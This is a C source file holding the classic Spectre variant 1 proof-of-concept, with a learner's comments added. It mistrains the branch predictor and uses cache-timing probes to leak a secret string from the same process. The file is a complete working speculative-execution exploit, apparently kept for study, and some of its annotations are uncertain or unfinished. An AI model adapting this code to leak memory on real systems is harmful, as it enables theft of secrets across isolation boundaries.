#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

/********************************************************************
  Victim code.
 ********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t probeArray[256 * 512];

char *secret = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0; /* To not optimize out victim_function() */

void victim_function(size_t x) {
  // signed v unsigned comparison
  // if x is negative, then its unsigned rep is huge
  // and likely larger than array1_size
  if (x < array1_size) {
    // x is a value that probes into the secret array
    temp &= probeArray[array1[x] * 512];
  }
}

/********************************************************************
  Analysis code
 ********************************************************************/
#define CACHE_HIT_THRESHOLD (80) /* cache hit if time <= threshold */

/* Report best guess in value[0] and runner-up in value[1] */
// malicious_x is the index into the secret array
// this method runs for each letter in the secret array
void readMemoryByte(size_t malicious_x, uint8_t value[2],
    int score[2]) {
  static int results[256];
  int tries,i,j,k,mix_i;;
  size_t training_x, x;
  int junk = 0;
  register uint64_t time1, time2;
  volatile uint8_t *addr;

  // set everything in results to 0. Why?
  for (i = 0; i < 256; i++)
    results[i] = 0;

  // 1k trials
  // 1 trial is 30 probes
  for (tries = 999; tries > 0; tries--) {
    /* Flush probeArray[256*(0..255)] from cache */
    for (i = 0; i < 256; i++)
      _mm_clflush(&probeArray[i * 512]); /* clflush */

    /* 5 trainings (x=training_x) per attack run (x=malicious_x) */
    training_x = tries % array1_size;
    for (j = 29; j >= 0; j--) {
      _mm_clflush(&array1_size);

      // delay (can also mfence)
      for (volatile int z = 0; z < 100; z++) {
      }

      /* Bit twiddling to set x=training_x if j % 6 != 0
       * or malicious_x if j % 6 == 0 */
      /* Avoid jumps in case those tip off the branch predictor */
      /* Set x=FFF.FF0000 if j%6==0, else x=0 */
      x = ((j % 6) - 1) & ~(0xFFFF);
      /* Set x=-1 if j&6=0, else x=0 */
      x = (x | (x >> 16));
      x = training_x ^ (x & (malicious_x ^ training_x));

      /* Call the victim! */
      // first 5 'x's are valid in bounds indices
      // sixth x is out of bounds into the secret phrase array
      victim_function(x);
    }

    // ************************************************************
    //By this time the cache should have been speculatively filled in
    // even if we were out of bounds
    // ************************************************************
    
    /* Time reads. Mixed-up order to prevent stride prediction */
    // read everything in the probeArray (size 256 * 512)
    //printf("newset\n");
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      //printf("Checking index: %d\n",mix_i);
      addr = &probeArray[mix_i * 512];

      // read and time
      time1 = __rdtscp(&junk);
      junk = *addr; /* Time memory access */
      time2 = __rdtscp(&junk) - time1; /* Compute elapsed time */
      // end read and time

      // delta indicates cache hit
      // &&
      // mix_i [0,256) != array1[ [0,999) mod 16 ]
      // ^ what does this mean? The 
      if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
        results[mix_i]++; /* cache hit -> score +1 for this value */
    }


    /* Locate highest & second-highest results */
    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || results[i] >= results[j]) {
        k = j;
        j = i;
      } else if (k < 0 || results[i] >= results[k]) {
        k = i;
      }
    }

    if (results[j] >= (2 * results[k] + 5) ||
        (results[j] == 2 && results[k] == 0))
      break; /* Success if best is > 2*runner-up + 5 or 2/0) */
  }

  // whats in results? should be results of 1000 trials
//  printf("Trial Results:\n");
//  for (i = 0; i < 256; i++) {
//    printf("res %c: %d\n",i,results[i]);
//  }

  /* use junk to prevent code from being optimized out */
  results[0] ^= junk;
  value[0] = (uint8_t)j;
  score[0] = results[j];
  value[1] = (uint8_t)k;
  score[1] = results[k];
}

int main(int argc, const char **argv) {
  // size t is at least 16 bits (2 bytes)
  // address of secret phrase - address of array1
  // default for malicious_x
  // array1 is size 130 first 16 values are [1,16]
  // secret is size 40
  size_t malicious_x =
    (size_t)(secret - (char *)array1);
  printf("secret is at: %p\n",secret); // this address changes
  printf("array1 is at: %p\n",array1); // this address changes
  printf("the distance is: %d\n",malicious_x); // this value stays constant -378
  int len = 40; // len of secret phrase

  // not sure what these do yet
  uint8_t value[2];
  int score[2];
  int i;

  // write to probeArray to ensure it is memory backed
  for (i = 0; i < sizeof(probeArray); i++)
    probeArray[i] = 1;


  /* ignore for now: just running program with args
     if (argc == 3) {
     sscanf(argv[1], "%p", (void **)(&malicious_x));
     malicious_x -= (size_t)array1; // Input value to pointer
     sscanf(argv[2], "%d", &len);
     }
     */

  printf("Reading %d bytes:\n", len);
  // for every letter, we readMemoryByte
  while (--len >= 0) {
    printf("Reading at malicious_x = %p... ", (void *)malicious_x);
    // malicous_x is the distance between:
    //  secret_phrase and the array1
    readMemoryByte(malicious_x++, value, score);
    printf("%s: ", score[0] >= 2 * score[1] ? "Success" : "Unclear");
    printf("0x%02X=/'%c/' score=%d ", value[0],(value[0] > 
          31 && value[0] < 127 ? value[0] : '?'), score[0]);
    if (score[1] > 0)
      printf("(second best: 0x%02X score=%d)", value[1], score[1]);
    printf("\n");
  }
  return (0);
}
